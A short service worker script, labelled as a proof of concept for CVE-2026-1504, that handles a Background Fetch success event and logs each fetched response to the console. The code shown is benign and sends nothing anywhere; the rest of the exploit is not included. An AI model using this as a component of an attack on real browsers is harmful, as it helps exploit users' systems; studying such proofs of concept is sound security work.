// sw.js - Service Worker for Background Fetch (CVE-2026-1504 PoC)

self.addEventListener('backgroundfetchsuccess', (event) => {
    const bgFetch = event.registration;
    event.waitUntil(async function() {
        const records = await bgFetch.matchAll();
        for (const record of records) {
            const response = await record.responseReady;
            console.log('Fetched data:', await response.text());
        }
    }());
});
